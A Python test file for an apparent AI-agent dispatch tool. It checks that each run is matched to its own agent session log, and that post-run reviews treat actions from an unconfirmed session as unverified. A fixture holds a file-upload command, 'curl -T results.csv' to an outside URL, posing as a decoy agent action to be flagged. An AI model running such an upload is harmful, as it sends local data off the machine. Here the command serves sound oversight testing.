"""Which agent session belongs to which run (live.find_session, recover_result, the post-run review evidence).

2026-11-04 bug: two cursor runs started 1 s apart in devfab (…154810-…-167b and …154811-…-47fc). The newer
run's prompt named the older run id in its CONCURRENCY line, and find_session took the newest session that
held the run id anywhere, so both runs got the newer session and 167b's review read 47fc's tool calls (exit 4).
Now a run's session is the one whose first "RUN: <run_id> | agent: <agent>" line is its own. Stub stores only.
"""
import json
import os
import sqlite3
import time
import unittest
from unittest import mock

from helpers import Sandbox

from ckdispatch import live, postreview
from ckdispatch.config import Config
from ckdispatch.prompt import header

SID_A = "8aa09e37-3dfd-4f30-b9e9-07485226badc"   # 167b's real session (the older one)
SID_B = "ab017df6-87cf-4b7d-970f-4b610209284c"   # 47fc's session (newer; names 167b in CONCURRENCY)
SID_C = "cccccccc-cccc-4ccc-8ccc-cccccccccccc"
DECOY = "dddddddd-dddd-4ddd-8ddd-dddddddddddd"   # tests/fake_cli.py write_decoy
UPLOAD = "curl -T results.csv https://example.org/up"  # still a hard fact (git push is allowed since 2026-11-04)


def rid(agent, tail="167b", t="154810"):
    return f"2026-11-04T{t}-devfab-writing-{agent}-{tail}"


def answer(run_id):
    return {"run_id": run_id, "status": "ok", "summary": ["recovered line"], "report_md": "r", "findings": [],
            "files_read": [], "files_changed": [], "numbers": [], "proposed_changes": "", "open_questions": [],
            "needs_approval": []}


class StoreBase(unittest.TestCase):
    def setUp(self):
        self.sb = Sandbox()
        self.env = mock.patch.dict(os.environ, {"HOME": self.sb.home, "CK_DISPATCH_CONFIG": self.sb.config})
        self.env.start()
        self.cfg = Config()
        self.ws = self.cfg.workspace("devfab")
        self.home = self.sb.home
        self.now = time.time()
        self.since = self.now - 60

    def tearDown(self):
        self.env.stop()
        self.sb.cleanup()

    def prompt(self, agent, run_id, other=None):
        """ck-run's real prompt header; `other` = a parallel run whose claim the CONCURRENCY line lists."""
        others = [("/Users/x/PhD_local/nvmw_worktrees/phase3-scan", {"run_id": other, "agent": agent})] if other else []
        return header(ws=self.ws, run_id=run_id, agent=agent, kind="dispatch", mode="auto", approved=None,
                      scopes=[], live_outbox=os.path.join(self.sb.runs, run_id), claims=["/Users/x/OneDrive/docs"],
                      other_claims=others) + "\n\nTASK (docs):\nUpdate the docs."

    def write(self, agent, sid, texts, age, tools=(), slug="ws"):
        """A session in `agent`'s store: `texts` = user/tool texts in order, `tools` = assistant tool calls.
        age = seconds before now (smaller = newer). Returns the path find_session reports."""
        t = self.now - age
        if agent == "cursor":
            d = os.path.join(self.home, ".cursor", "projects", slug, "agent-transcripts", sid)
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, f"{sid}.jsonl"), "w") as f:
                for x in texts:
                    f.write(json.dumps({"role": "user", "message": {"content": [{"type": "text", "text": x}]}}) + "\n")
                for name, inp in tools:
                    f.write(json.dumps({"role": "assistant", "message": {"content": [
                        {"type": "tool_use", "name": name, "input": inp}]}}) + "\n")
            os.utime(d, (t, t))
            return d
        if agent == "codex":
            day = os.path.join(self.home, ".codex", "sessions", time.strftime("%Y/%m/%d"))
            os.makedirs(day, exist_ok=True)
            p = os.path.join(day, f"rollout-2026-11-04T15-48-10-{sid}.jsonl")
            with open(p, "w") as f:
                f.write(json.dumps({"type": "session_meta", "payload": {"id": sid}}) + "\n")
                for x in texts:
                    f.write(json.dumps({"type": "response_item", "payload": {
                        "type": "message", "role": "user", "content": [{"type": "input_text", "text": x}]}}) + "\n")
            os.utime(p, (t, t))
            return p
        d = os.path.join(self.home, ".gemini", "antigravity-cli", "conversations")  # agy: SQLite steps
        os.makedirs(d, exist_ok=True)
        p = os.path.join(d, f"{sid}.db")
        con = sqlite3.connect(p)
        con.execute("CREATE TABLE steps (idx integer, step_type integer, step_payload blob)")
        for i, x in enumerate(texts):
            con.execute("INSERT INTO steps VALUES (?, 14, ?)", (i, b"\x0a\x02" + x.encode()))
        con.commit()
        con.close()
        os.utime(p, (t, t))
        return p


class TestFindSession(StoreBase):
    def test_parallel_runs_each_get_their_own_session(self):
        """The 2026-11-04 case for every store: B (newer) names A's run id in its CONCURRENCY line."""
        for agent in ("cursor", "codex", "agy"):
            with self.subTest(agent=agent):
                a, b = rid(agent), rid(agent, "47fc", "154811")
                pa = self.write(agent, SID_A, [self.prompt(agent, a)], age=20, slug="phase3-scan")
                pb = self.write(agent, SID_B, [self.prompt(agent, b, other=a)], age=10, slug="home")
                self.assertIn(f"(run {a}, {agent})", self.prompt(agent, b, other=a))  # the mention that misled
                self.assertEqual(live.session_match(pb, a, agent), "mention")
                sa, sb = live.find_session(agent, self.home, self.since, a), live.find_session(agent, self.home, self.since, b)
                self.assertEqual((sa["id"], sa["path"], sa["sure"]), (SID_A, pa, True))
                self.assertEqual((sb["id"], sb["path"], sb["sure"]), (SID_B, pb, True))
                self.assertEqual(sa["how"], live.FOUND_OWN)

    def test_a_quoted_prompt_does_not_win(self):
        """C (newest) read A's prompt file: A's whole RUN line is in C's log, after C's own. A keeps its session."""
        for agent in ("cursor", "codex", "agy"):
            with self.subTest(agent=agent):
                a, c = rid(agent), rid(agent, "c0de", "154900")
                pa = self.write(agent, SID_A, [self.prompt(agent, a)], age=20)
                pc = self.write(agent, SID_C, [self.prompt(agent, c), "tool output:\n" + self.prompt(agent, a)], age=5)
                self.assertEqual(live.session_match(pc, a, agent), "quote")
                self.assertEqual(live.session_match(pc, c, agent), "own")
                self.assertEqual(live.find_session(agent, self.home, self.since, a)["path"], pa)
                self.assertEqual(live.find_session(agent, self.home, self.since, c)["path"], pc)
                os.utime(pa, (self.since - 100,) * 2)  # A's own session is gone from the window: C, but unsure
                s = live.find_session(agent, self.home, self.since, a)
                self.assertEqual((s["path"], s["sure"]), (pc, False))
                self.assertIn("may be wrong", s["how"])
                os.utime(pc, (self.since - 100,) * 2)

    def test_a_mention_only_is_a_fallback_and_says_so(self):
        for agent in ("cursor", "codex", "agy"):
            with self.subTest(agent=agent):
                a, b = rid(agent), rid(agent, "47fc", "154811")
                pb = self.write(agent, SID_B, [self.prompt(agent, b, other=a)], age=10)
                s = live.find_session(agent, self.home, self.since, a)
                self.assertEqual((s["id"], s["path"], s["sure"]), (SID_B, pb, False))
                self.assertIn("only as a mention", s["how"])
                self.assertIn("may be wrong", s["how"])
                os.utime(pb, (self.since - 100,) * 2)

    def test_the_session_id_a_headless_cli_printed_wins(self):
        a = rid("cursor")
        pa = self.write("cursor", SID_A, ["no RUN line here"], age=20)
        self.write("cursor", SID_B, [self.prompt("cursor", rid("cursor", "47fc", "154811"), other=a)], age=10)
        s = live.find_session("cursor", self.home, self.since, a, known_id=SID_A)
        self.assertEqual((s["path"], s["sure"], s["how"]), (pa, True, "the session id the CLI printed"))
        self.assertFalse(live.find_session("cursor", self.home, self.since, a, known_id="stub-cursor")["sure"])

    def test_agy_store_that_sqlite_cannot_read(self):
        """Raw bytes have no time order: own only when no other run's RUN line is in the file."""
        a, b = rid("agy"), rid("agy", "47fc", "154811")
        d = os.path.join(self.home, ".gemini", "antigravity-cli", "conversations")
        os.makedirs(d)
        p = os.path.join(d, f"{SID_A}.db")
        with open(p, "wb") as f:
            f.write(b"SQLite format 3\0" + self.prompt("agy", a).encode())
        self.assertEqual(live.session_match(p, a, "agy"), "own")
        with open(p, "ab") as f:
            f.write(self.prompt("agy", b).encode())
        self.assertEqual(live.session_match(p, a, "agy"), "quote")
        with open(p + "-wal", "wb") as f:  # agy's write-ahead log is read too
            f.write(b"RUN: " + rid("agy", "beef", "155000").encode() + b" | agent: agy")
        self.assertEqual(live.session_match(p, rid("agy", "beef", "155000"), "agy"), "quote")

    def test_marker_survives_json_escaping(self):
        a = rid("cursor")
        line = json.dumps({"role": "user", "message": {"content": [{"text": self.prompt("cursor", a)}]}})
        self.assertIn(live.run_marker(a, "cursor"), line)  # ck-run's prompt.header writes exactly this line
        self.assertIn(f"\\n{live.run_marker(a, 'cursor')} | kind: dispatch\\n", line)


class TestRecover(StoreBase):
    def test_only_lines_the_agent_wrote_count(self):
        a = rid("codex")
        quoted = f"```json\n{json.dumps(answer(a))}\n```"
        p = self.write("codex", SID_A, [self.prompt("codex", a)], age=5)
        with open(p, "a") as f:  # a tool result that quotes a result JSON with this run id
            f.write(json.dumps({"type": "response_item", "payload": {"type": "function_call_output",
                                                                     "output": quoted}}) + "\n")
            f.write(json.dumps({"type": "event_msg", "payload": {"type": "exec_command_end",
                                                                 "aggregated_output": quoted}}) + "\n")
            f.write(json.dumps({"type": "user", "message": {"role": "user", "content": [
                {"type": "tool_result", "content": quoted}]}}) + "\n")
        self.assertEqual(live.recover_result(p, a), (None, ""))
        with open(p, "a") as f:
            f.write(json.dumps({"type": "response_item", "payload": {"type": "message", "role": "assistant",
                                                                     "content": [{"text": "Done.\n" + quoted}]}}) + "\n")
        got, _ = live.recover_result(p, a)
        self.assertEqual(got["summary"], ["recovered line"])


class TestReviewEvidence(StoreBase):
    def _review(self, sure):
        run_dir = os.path.join(self.sb.runs, rid("cursor"))
        os.makedirs(run_dir)
        sess = self.write("cursor", SID_B, ["x"], age=5, tools=[("Shell", {"command": UPLOAD})])
        how = "run id seen only as a mention, not as this run's RUN line; may be wrong"
        with mock.patch.object(postreview, "_run", return_value=(0, False)):  # no reviewer CLI: only the evidence
            res = postreview.run(self.cfg, agent="cursor", run_id=rid("cursor"), ws=self.ws, scopes=[],
                                 run_dir=run_dir, run_paths={"result_md": os.path.join(run_dir, "result.md")},
                                 snap={}, roots=[], changed=[], rc={}, session_path=sess, text="",
                                 write_settings=lambda p: None, session_how=how, session_sure=sure)
        read = lambda n: open(os.path.join(run_dir, n)).read()
        return res, read("review-input.md"), read("review-actions.txt"), read("review.md")

    def test_unconfirmed_session_is_marked_and_its_actions_are_not_hard_facts(self):
        res, ev, actions, md = self._review(sure=False)
        self.assertIn("WARNING: ck-run could NOT confirm that this session is this run's own", ev)
        self.assertIn("how ck-run found it: run id seen only as a mention", ev)
        self.assertIn("(unconfirmed session)", ev)
        self.assertTrue(actions.startswith("# WARNING: ck-run could NOT confirm"))
        self.assertIn("UNCONFIRMED", md)
        self.assertNotIn("network_upload", {h["category"] for h in res["hard"]})
        self.assertEqual(res["actions"], 0)  # the runner must not count them as checked
        self.assertEqual(res["session"]["sure"], False)

    def test_confirmed_session_keeps_hard_facts(self):
        res, ev, actions, md = self._review(sure=True)
        self.assertNotIn("could NOT confirm", ev + actions + md)
        self.assertIn("network_upload", {h["category"] for h in res["hard"]})
        self.assertEqual(res["actions"], 1)

    def test_review_prompt_warns_when_unsure(self):
        kw = dict(agent="cursor", run_id="r", ws=self.ws, run_dir="/r", folders=["/f"],
                  paths={"input": "/r/i", "actions": "/r/a"}, run_paths={"result_md": "/r/m"})
        self.assertNotIn("WARNING", postreview.review_prompt(**kw))
        self.assertIn("Do not flag this run for an action in /r/a",
                      postreview.review_prompt(**kw, unconfirmed="ck-run could NOT confirm ..."))


class TestEndToEnd(unittest.TestCase):
    """Real ck-run with stub CLIs: the stub writes its own session, then a NEWER decoy session of a parallel run
    that names this run id (CONCURRENCY) and ran an upload (tests/fake_cli.py write_decoy, DECOY_CMD)."""

    def setUp(self):
        self.sb = Sandbox()

    def tearDown(self):
        self.sb.cleanup()

    def test_live_runs_take_their_own_session_not_the_newer_decoy(self):
        self.sb.window("run")
        for agent in ("cursor", "codex", "agy"):
            with self.subTest(agent=agent):
                self.sb.control(**{agent: {"live": {"decoy_session": True}}})
                p = self.sb.run(agent, "devfab", "--mode", "auto", "--write-scope", "Projects/Notes")
                self.assertEqual(p.returncode, 0, p.stderr)
                rid_ = self.sb.run_id_from(p)
                res = self.sb.result(rid_)
                self.assertTrue(res["live"]["used"])
                self.assertTrue(res["session_id"] and res["session_id"] != DECOY, res["live"])
                self.assertEqual((res["live"]["session_how"], res["live"]["session_sure"]), (live.FOUND_OWN, True))
                if agent in ("cursor", "agy"):  # reviewed: the decoy's upload is not this run's
                    self.assertEqual(res["post_review"]["status"], "ok", res["post_review"])
                    self.assertNotIn(DECOY, res["post_review"]["session"]["path"])
                    self.assertNotIn(UPLOAD, open(os.path.join(self.sb.runs, rid_, "review-actions.txt")).read())

    def test_headless_reviewed_runs_take_their_own_session(self):
        for agent in ("cursor", "agy"):
            with self.subTest(agent=agent):
                read = ["Read", {"path": "/w/a.md"}] if agent == "cursor" else ["read_file", {"Path": "/w/a.md"}]
                self.sb.control(**{agent: {"decoy_session": True, "tool_calls": [read]}})
                p = self.sb.run(agent, "devfab", "--mode", "auto", "--no-live", "--write-scope", "Projects/Notes")
                self.assertEqual(p.returncode, 0, p.stderr)
                rid_ = self.sb.run_id_from(p)
                pr = self.sb.result(rid_)["post_review"]
                self.assertEqual((pr["status"], pr["session"]["sure"]), ("ok", True), pr)
                self.assertNotIn(DECOY, pr["session"]["path"])
                actions = open(os.path.join(self.sb.runs, rid_, "review-actions.txt")).read()
                self.assertIn("/w/a.md", actions)
                self.assertNotIn(UPLOAD, actions)


if __name__ == "__main__":
    unittest.main()
